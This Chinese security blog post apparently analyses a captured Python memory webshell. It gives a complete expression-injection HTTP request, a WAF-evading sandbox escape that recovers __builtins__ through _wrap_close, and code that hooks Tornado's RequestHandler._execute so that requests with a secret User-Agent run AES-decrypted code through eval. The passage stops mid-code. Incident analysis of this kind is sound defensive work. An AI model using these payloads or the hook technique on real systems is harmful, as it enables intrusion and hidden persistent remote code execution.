---
title: 第174篇：Python 型内存马注入与沙箱逃逸（记一次应急响应中的内存马样本分析）
url: https://mp.weixin.qq.com/s/W-TvHJVSaR8Rsy5HYX17pw
source: Doonsec's feed
date: 2026-09-28
fetch_date: 2026-09-29T07:38:12.960617
---

# 第174篇：Python 型内存马注入与沙箱逃逸（记一次应急响应中的内存马样本分析）

# 第174篇：Python 型内存马注入与沙箱逃逸（记一次应急响应中的内存马样本分析）

原创

abc123info
abc123info

希潭实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png)

## Part1 前言

大家好，我是 ABC\_123。在内存马领域，Java 内存马最为常见，其次是 .NET 内存马；Python 内存马则由于应用场景较少、公开案例有限，在实际环境中并不多见。近期，有网友通过安全设备捕获到一个 Python 内存马样本，我看了下，只有一个 HTTP 请求数据包，没有完整的服务端 Web 代码可供参考；于是结合客户端逻辑，对服务端代码做了初步还原。接下来简要分析一下这个 Python 内存马的实现，相信日后能派上用场。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2Zc77PyLkuDupKmynbgOEwUUWTzUVjztJ8lNBUiaU9icoEOBhMD2DdLFiazribOgicGo0O9910qnCUP5NsLGWiabqBwOm1v6GShlmRj0/640?wx_fmt=png&from=appmsg)

 Part2 技术研究过程

* 测试环境演示

使用 python 的 Tornado 框架编写 app.py 监听8888端口，实现了一个测试环境。该环境模拟了一个"企业流程管理平台 — 工作流查询"控制台：页面提供流程关键词、实例 ID、高级条件三项查询条件，后端 POST /api/workflow.search 接收到 search\_condition 参数后，会调用表达式解析逻辑对其中的 Python 表达式进行求值，并将结果作为后续查询条件，再按密文与发起人比对、过滤出匹配的流程实例返回。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2ZStuE9QWr2gd1eYRRo9fiagAuyI5Nyja1ZU09IG9RWG8kdAYGCiazMRB29zAtrY6fTGuNcWd3TBDVbfbzhp3vBpaRfLGq8jaiaVQ/640?wx_fmt=png&from=appmsg)

抓取数据包如下，在json文本中的search\_condition处，存在一个python表达式注入导致的代码执行漏洞，接下来我们研究一下这个过程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2YmVypRIoY7Ey6VR1Jia7VaibtxZs5zDib1SRH7H8SQJn1JScQUYdppIOdheJFP5GwO5BljtNqArYfPcD1Fo3S3tLfnlcgz0nl5zc/640?wx_fmt=png&from=appmsg)

##

* ## 构造http请求数据包打入内存马

构造http请求数据包打入冰蝎内存马如下：

```
POST /api/workflow.search HTTP/1.1Host: 127.0.0.1:8888Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Content-type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36Referer: http://127.0.0.1:8888/api/workflow.searchContent-Length: 5419
{"workflow_inst":{"inst_id":1},"search_condition":"=CryptoUtil.encrypt('1234567890123456',(lambda g: (g['ex'+'ec'](g['__im'+'port__']('ba'+'se64').b64decode('IyAtKi0gY29k......UgPSBfc2hlbGxfZXhlY3V0ZQ==').decode(),{'__builtins__': g}),'ok')[1])([c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wr'+'ap_close'][0].__init__.__globals__['__buil'+'tins__']),'1234567890123456')","form_values":{"keyword":"test"}}
```

如图所示，使用冰蝎3可以连接成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2ayuE3WpPVw43t63j40FbEHj8iaMMNzKKMYWDQKtoh74UK7335micKUwbGJnIibebpakMicHFib4ZnIlOHyEkXqOfZFAibcqsIqeV9jk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2YcU6QSyEiaF6Q29aibeCaicTYtFr4dk1xjCg3Jf4jfic30LibguQGBxjcdrJCAMiambWicRzDX9KwdpAiazaU0zdjLCgE48YNca68ciaiaY/640?wx_fmt=png&from=appmsg)

##

* ## python沙箱逃逸重新获取builtins

存在漏洞的关键业务代码如下所示：expression表示http请求中json数据包的search\_condition去掉开头=后的字符串，被当作python表达式求值；`{"__builtins__": {}}`是沙箱，把内置的函数命名空间清空，导致攻击者很多危险函数没办法使用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2Zzeypcx4Ay5WbSfBHpFwCT9es2Vhd0uHB6IVTqyianXiab40ib1bnqy3KnOlqwiahVAY6icL35C9ChNVxz262ibeCDbxVgkqznNkS4U/640?wx_fmt=png&from=appmsg)

为了绕过沙箱限制，需要重新拿到 python 的 `__builtins__`，然后调用 exec() 执行任意代码。通常的做法就是通过 Python 对象继承链找到一个系统类，再从它的函数全局变量中找回 `__builtins__`，恢复 exec 能力，最终执行隐藏的 Base64 Python Payload。上述打入冰蝎内存马的大致代码如下：

```
(lambda g: (g['ex'+'ec'](g['__im'+'port__']('ba'+'se64').b64decode('IyAtKi0gY29k......X2V4ZWN1dGUgPSBfc2hlbGxfZXhlY3V0ZQ==').decode(),{'__builtins__': g}),'ok')[1])([c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wr'+'ap_close'][0].__init__.__globals__['__buil'+'tins__'])
```

关键字拆分是为了绕过WAF防护及拦截，去除关键字拆分，整体payload结构等同于如下形式：

```
(lambda g: (    g['exec'](        g['__import__']('base64').b64decode('<1.2KB>').decode(),        {'__builtins__': g}    ),    'ok')[1])(    [c for c in ().__class__.__base__.__subclasses__()     if c.__name__=='_wrap_close'][0]     .__init__.__globals__['__builtins__'])
```

第一眼看起来很乱，以[1]为基准分成左右两部分，右半部分提取如下，发现是为了绕过python的沙箱限制从而获取 `__builtins__`，有了`__builtins__`就有可以执行任意代码的exec方法了。

```
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['__builtins__']
```

接下来详细分析如下：

`()` 是一个空元组对象，`().__class__` 取出这个对象的类型（即 `tuple`），相当于 Java 的 `obj.getClass()`；`().__class__.__base__` 再取它的父类，相当于 Java 的 `tuple.class.getSuperclass()`，得到的就是 `object`。而 `object.__subclasses__()` 返回的是当前 Python 解释器中所有直接继承 `object` 的子类。

之所以不直接写 `object.__subclasses__()`，而要从 `().__class__.__base__` 绕一圈，是因为 Python 的名字解析依赖内建命名空间：沙箱通常把 `__builtins__` 清空，此时 `object` 这个名字已不可用，直接写会抛 `NameError: name 'object' is not defined`；而 `()` 是语法字面量，不依赖任何名字，从它出发全部走属性访问，就绕开了对名字的限制。

为了拿到 `exec`，接下来要在这些子类中挑一个"好用"的类，它需要同时满足三点：来自标准库、拥有 Python 函数形式的方法（C 函数没有 `__globals__`）、能借此泄露模块的全局命名空间。同时要注意，`__subclasses__()` 只能看到当前进程已经加载的类，命中率取决于目标环境加载了什么，而`_wrap_close` 恰好符合上述条件：它是 `popen` / `Popen` 用来包装文件对象的辅助类，所属模块（历史版本是 `subprocess`，较新的 Python 里是 `os`）在很多基于 Python 标准库的 Web 应用环境中较容易出现，因此它经常出现在 `__subclasses__()` 里，经常被用于该类逃逸链。

一旦找到出现在`object.__subclasses__()`中的\_wrap\_close，在`_wrap_close.__init__.__globals__`可以获取一个字典。这个字典就是该类所属模块的全局变量表——模块被导入时，解释器会往里面注入模块级的 `__builtins__`。从这里取出 `__builtins__`，就等于把沙箱清掉的那套内置函数原样捡了回来，其中的 `exec` 和 `__import__` 正是后续任意代码执行所依赖的入口。

```
    'sys': ...,    'path': ...,    'stat': ...,    '__builtins__': ...}```
```

##

* ## lambda 借助 builtins 的 exec 执行任意代码

弄清楚 payload 的右半部分（lambda 那一段）就会发现，整条 payload 的执行顺序是从右往左的：右半部分先把 `__builtins__` 挖出来，作为实参传给左边的 lambda，再用它执行任意代码。这里的 `g` 就是上一步拿到手的 `__builtins__`，它是一个字典（不是模块对象），里面装着解释器的全部内置函数：

```
{    "print": <function print>,    "len": <function len>,    "eval": <function eval>,    "exec": <function exec>,    "__import__": <function __import__>,    ...}
```

`g['exec']`：从字典里取出真正的 `exec`——沙箱清空的是内置命名空间，沙箱限制的是当前执行环境中的名字解析，而攻击者通过对象关系链重新获取了另一个包含完整内置函数引用的 \_\_builtins\_\_ 字典；

`g['__import__']('base64').b64decode('<1.2KB>').decode()`：用真正的 `__import__` 导入 base64 模块，把藏在请求里的 Base64 载荷还原成 Python 源码；

 `{'__builtins__': g}`：为被执行代码指定全局命名空间。这样载荷里的 `__import__`、`eval` 等内置名字都能直接解析到。

```
(lambda g: (     g['exec'](         g['__import__']('base64').b64decode('<1.2KB>').decode(),         {'__builtins__': g}     ),     'ok' )[1])(<右半部分逃逸链取到的 builtins>)
```

lambda g: xxx 就是匿名函数，完全等价于：

```
def func(g):    return xxx
```

所以整条 payload 也可以读成"定义函数 + 立即调用"，这段 Base64 解码出来，正是下一节要分析的 Tornado 内存马源码。

```
(lambda g:     g['exec'](...))(这里拿到的builtins)
```

* ## 内存马代码解读：一行 Monkey Patch 修改 Tornado 全局请求处理入口

这类 Python 内存马的核心技术叫 Runtime Hook（运行时钩子），本质上利用了 Python 的动态特性，通过 Monkey Patch（运行时修改） 改变程序运行时的行为。它不会修改磁盘上的源码文件，而是在 Web 服务已经启动后，直接修改进程内存中的对象关系。如下这行代码把 Tornado 原本负责处理请求的 `_execute` 方法替换成攻击者定义的 `_shell_execute` 方法，也就是把“正常的请求处理入口”换成了“攻击者控制的入口”：

```
_tw.RequestHandler._execute = _shell_execute
```

之所以修改一个 `_execute` 方法就能影响整个站点，原因有两点：

1.  所有  Tornado Handler（例如业务接口、登录页面、API 接口等）最终都继承自 `RequestHandler`。Python 在调用方法时采用动态查找机制（MRO，Method Resolution Order），会按照“当前类 → 父类 → 基类”的顺序寻找方法。当业务 Handler 自己没有定义 `_execute` 时，就会继续从父类 `RequestHandler` 中寻找。

2.  选择 `_execute` 作为 Hook 点，是因为它处于 Tornado 请求处理流程的关键位置。请求经过路由匹配、请求数据加载后，会进入 `_execute`，然后才执行具体的 `get()`、`post()` 等业务代码。因此在这里插入逻辑，可以在业务代码执行之前检查请求。如果请求满足攻击者设置的条件，就执行内存马逻辑；如果不是目标请求，则调用保存下来的原始 `_execute`，继续执行正常业务。

这种技术的关键不是修改函数代码，而是修改“函数引用”。Python 中类的方法实际上也是对象引用，原本：

```
RequestHandler._execute → Tornado原始函数
```

```
替换后：
```

```
RequestHandler._execute → 恶意函数
```

```

```

这个 Python 内存马替换了 Tornado 的 \_execute 请求入口，所有请求先进入 `_shell_execute`。它通过 User-Agent 判断是否为攻击者请求，如果不是则调用原始 `_execute` 保持业务正常；如果是，则读取 POST 参数，AES 解密出 Python 代码，通过 `eval()` 执行，并将执行结果加密返回，实现隐藏式远程代码执行。

```
import tornado.web as _tw
_ORIG_EXEC = _tw.RequestHandler._execute_UA = 'Mozilla/6.3.3 (Huawei Mate 80 Pro) AppleWebKit/537.361 (KHTMLs, like Geckos) Chrome/66.0.3325.633 Safaris/633'_KEY = b'1234567890123456'_IV = b'1234567890123456'
async def _shell_execute(self, transforms, *args, **kwargs):    self._transforms = transforms    if _shell_dispatch(self):        return    await _ORIG_EXEC(self, transforms, *args, **kwargs)
def _shell_dispatch(self):    if self.request.hea...